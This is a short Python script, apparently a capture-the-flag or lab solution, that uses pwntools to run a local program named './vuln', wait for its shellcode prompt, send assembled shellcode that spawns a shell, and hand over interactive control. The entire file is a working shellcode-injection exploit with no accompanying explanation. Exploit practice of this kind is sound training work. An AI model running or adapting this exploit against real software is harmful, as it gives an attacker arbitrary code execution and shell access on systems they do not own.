#!/usr/bin/env python

from pwn import *

r = process("./vuln")
r.recvuntil("Enter your shellcode:\n")
r.sendline(asm(shellcraft.sh()))

r.interactive()
r.close()
